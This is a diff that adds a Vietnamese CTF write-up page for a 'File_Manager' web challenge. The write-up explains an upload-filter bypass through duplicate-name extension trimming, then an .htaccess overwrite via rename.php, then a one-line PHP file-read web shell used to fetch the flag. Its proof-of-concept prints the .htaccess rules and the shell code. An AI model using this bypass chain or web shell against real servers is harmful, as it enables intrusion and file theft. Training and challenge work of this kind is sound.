@@ -1,0 +1,1216 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../..">
+      
+      
+        <link rel="next" href="../../U%27ve_Got_Mail/write-up/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.2">
+    
+    
+      
+        <title>File_Manager - H1in's CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.57a0d79d.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#file_manager" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="H1in&#39;s CTF Writeups" class="md-header__button md-logo" aria-label="H1in's CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            H1in's CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              File_Manager
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="H1in&#39;s CTF Writeups" class="md-nav__button md-logo" aria-label="H1in's CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    H1in's CTF Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Welcome.
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BKSEC Write up
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    BKSEC Write up
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Manager
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    File Manager
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File_Manager
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File_Manager
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hint-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hint 1
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hint 2
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hint 3
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#qua-trinh-lam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quá trình làm
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oc-code-va-tim-loi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Đọc code và tìm lỗi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proof-of-concepts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Proof of concepts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Proof of concepts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#extra" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extra
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    U've Got Mail
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    U've Got Mail
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../U%27ve_Got_Mail/write-up/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    U've got mail
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reverse Engineering
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Reverse Engineering
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Behind The Scenes
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Behind The Scenes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Reverse_Engineering/Behind_The_Scenes/wu/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wu
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Fundamentals
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Reverse_Engineering/Fundamentals/re_101/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reverse Engineering 101: Fundamentals Note
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Simple Encriptor
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Simple Encriptor
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Reverse_Engineering/Simple_Encriptor/write-up/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Write up
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Spooky Pass
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Spooky Pass
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Reverse_Engineering/Spooky_Pass/write-up/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Write up
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hint-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hint 1
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hint 2
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hint 3
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#qua-trinh-lam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quá trình làm
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oc-code-va-tim-loi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Đọc code và tìm lỗi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proof-of-concepts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Proof of concepts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Proof of concepts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#extra" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extra
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="file_manager">File_Manager</h1>
+<p>Đầu tiên sau khi nhận web mình đã nhận được 3 hints to tướng.</p>
+<hr />
+<h3 id="hint-1">Hint 1</h3>
+<p><img alt="Hint 1 - Allow scanning" src="../imgs/hint1_allow_scanning.png" /></p>
+<p>hint 1: allow scanning -&gt; tra gg biết đến fuzzing, ffuf</p>
+<h3 id="hint-2">Hint 2</h3>
+<p><img alt="Hint 2 - .htaccess rule in uploads" src="../imgs/hint2_htaccess_rule.png" /></p>
+<p>hint 2: 1 đoạn code trong <code>/uploads</code> -&gt; ném cho AI phân tích để biết được nó là file <code>.htaccess</code> -&gt; tra gg biết là file config trong từng thư mục cho Apache web server</p>
+<p>-&gt; tìm hiểu tiếp thì biết ngoài Apache làm server backend thì còn có Nginx đứng đằng trước làm proxy điều hướng, lọc và feed Apache các request (biết được tồn tại Nginx do thử vào route <code>/uploads</code>)</p>
+<p><img alt="403 Forbidden on uploads route" src="../imgs/uploads_403_nginx.png" /></p>
+<p>-&gt; hiểu sơ bộ về cấu trúc web</p>
+<h3 id="hint-3">Hint 3</h3>
+<p><img alt="Hint 3 - Flag location" src="../imgs/hint3_flag_path.png" /></p>
+<p>hint để dễ kiếm flag hơn</p>
+<hr />
+<h2 id="qua-trinh-lam">Quá trình làm</h2>
+<p><img alt="File Manager main page" src="../imgs/file_manager_interface.png" /></p>
+<p>ấn tượng đầu tiên về web là nó là 1 web upload file.</p>
+<p>-&gt; tra gg upload file vulnerability: cơ bản là upload 1 file executable và trick server execute nó.</p>
+<p>ở đây t sẽ đẩy 1 file <code>.php</code> (lý do nhìn ở các route, rất nhiều file <code>.php</code> -&gt; server đang chạy = ngôn ngữ php, đẩy file <code>.php</code> lên có khả năng chạy được)</p>
+<p>tuy nhiên thử đẩy <code>.php</code> file thì bị lỗi <code>'file type not allowed'</code>. khá rõ ràng họ có cơ chế block</p>
+<p>-&gt; thử fuzzing = ffuf + list file extension AI. tuy nhiên là cái rabbit hole vì không thu lại được gì (không đẩy lên được, có đẩy lên được thì cũng chỉ toàn file có đuôi mà apache không tự động execute được)</p>
+<p>đổi hướng: chuyển qua fuzzing routes. vẫn như cũ, ffuf + list AI gen</p>
+<p>trong lúc chờ đợi thì mình đi mò tay xem nó có những có gì trước (dưới là note lúc đang làm bài):</p>
+<pre><code class="language-text">/index.php; 
+/uploads; 
+/upload.php(&quot;file type not allowed&quot;, appear when attempts to upload .php or .PHP or anything like that); 
+/exists.php?file=abc(response back with a simple json file {&quot;file&quot;:&quot;abc&quot;,&quot;exists&quot;:false}); 
+/download.php?id=a1fe58ea (happens whenever i tried to click download); 
+/uploads/new.txt (when i clicked download a uploaded file, seems to be called when /download.php?id=0d626dfe happens); 
+/delete.php (POST request to this to delete a uploaded file, the body of the request is id=0d626dfe the id of the file); 
+/rename.php (the body is id=a1fe58ea&amp;to=no.py, interesting thing is on the index.php it doesnt change the name, but download the file and the name is changed)
+i found some of the routes are 403. one of them is /uploads
+</code></pre>
+<p>sau đó so khớp với kết quả fuzzing thấy khớp.</p>
+<p><img alt="ffuf route fuzzing results" src="../imgs/ffuf_route_fuzzing.png" /></p>
+<p>và có lẽ là intentional, tác giả để folder <code>.git</code> đọc được bằng https</p>
+<p>-&gt; dump code về máy = tool git dumper</p>
+<hr />
+<h2 id="oc-code-va-tim-loi">Đọc code và tìm lỗi</h2>
+<p>Sau khi có code thì mọi chuyện sáng tỏ vì sao fuzzing file extension 0 được</p>
+<p><img alt="lib.php clean and blocked functions" src="../imgs/source_lib_blocked_clean.png" /></p>
+<p>thư viện có 2 hàm lọc chính là <code>clean()</code> và <code>blocked()</code>. xử lý khá sạch sẽ nên 0 upload được file có ích lên</p>
+<p><img alt="rename.php filter checks" src="../imgs/source_rename_logic.png" /></p>
+<p><code>rename.php</code> sử dụng hàm <code>blocked</code> và <code>clean</code> để làm sạch bất cứ cái tên nào được dùng để rename từ phía user</p>
+<p><img alt="upload.php filter checks" src="../imgs/source_upload_checks.png" /></p>
+<p>upload cũng tương tự</p>
+<p><img alt="upload.php duplicate extension trimming loop" src="../imgs/source_upload_while_loop.png" /></p>
+<p>tuy nhiên nếu để ý kĩ ta sẽ thấy 1 hàm xử lý trùng lặp khá bcuoi ở đây</p>
+<p>vòng <code>while</code> sẽ còn tiếp tục nếu tìm thấy file có đường dẫn (và tên) y hệt mình, trim phần extension cuối cùng ra (ví dụ nếu file là <code>abc.txt</code> thì sẽ trim phần <code>.txt</code> ra, còn nếu không có thì giữ nguyên và báo lỗi 0 ghi được, để tránh trim mãi thành vòng lặp vô hạn).</p>
+<p>nếu tên vẫn không giống nhau, thì gán đè lên luôn</p>
+<p>-&gt; ta có thể làm trò upload 2 file <code>evil.php.txt</code> lên. vì 2 file có tên y hệt nhau, khi file thứ 2 được tải lên sẽ ghi đè lên file thứ 1, cắt được đuôi <code>.txt</code> dùng để bypass <code>BLOCK_EXT</code> và file <code>evil.php</code> sẽ nằm trong <code>/uploads</code> chờ được execute</p>
+<p>lúc này ta quay lại với hint2, anh iu trungtqt đã gợi ý về file <code>.htaccess</code> và nó cho ta biết rằng mọi file ở trong uploads này nếu extension dính 'ph' sẽ không được phép execute. vì thế ta cần upload 1 file <code>.htaccess</code> cho phép chạy <code>.php</code> để ghi đè lên file gốc của hệ thống</p>
+<p>rõ ràng là ta không thể bình mới rượu cũ, upload 1 file <code>.htaccess</code> lên để nó ghi đè vào file <code>.htaccess</code> gốc được, vì cái vòng lặp while trong <code>upload.php</code> sẽ chặt mất đuôi <code>.htaccess</code> khi thấy có 2 file trùng nhau.
+may mắn là file <code>rename.php</code> thì cho rename và ghi đè thẳng lên file gốc, và trong danh sách <code>BLOCKED_EXT</code> cũng không ban <code>.htaccess</code></p>
+<p>-&gt; upload file <code>.htaccess</code> với một cái tên không bị block (E.g: <code>htaccess-override.txt</code>) và rename nó thành <code>.htaccesss</code> bằng <code>/rename.php</code></p>
+<p>việc còn lại là soạn code php để lấy flag từ <code>/var/www/flag1.txt</code> như hint3 (mình ai slop đoạn này) và kích hoạt nó.</p>
+<hr />
+<h2 id="proof-of-concepts">Proof of concepts</h2>
+<p><strong><code>htaccess-override.txt</code></strong></p>
+<pre><code class="language-apache">Require all granted
+AddType application/x-httpd-php .php
+</code></pre>
+<p>đẩy lên xong thì đổi tên thành <code>.htaccess</code></p>
+<p><strong><code>shell.php.txt</code></strong></p>
+<pre><code class="language-php">&lt;?php echo file_get_contents($_GET['cmd']); ?&gt;
+</code></pre>
+<p>execute qua <code>/uploads/shell.php?cmd=LINK-TO-FILE</code></p>
+<p><img alt="Flag retrieved via shell.php" src="../imgs/file_manager_flag.png" /></p>
+<hr />
+<h3 id="extra">Extra</h3>
+<p>Rất may là có hint3, nếu không thì không tìm được flag vì mình vẫn chưa chạy đc shell code</p>
+<p><img alt="shell_exec undefined error" src="../imgs/shell_exec_disabled_error.png" /></p>
+<p>có lẽ chức năng search hoặc chạy được shell code là dùng để fuzz đường dẫn đến flag file</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.a5f9d56c.min.js"></script>
+      
+    
+  </body>
+</html>
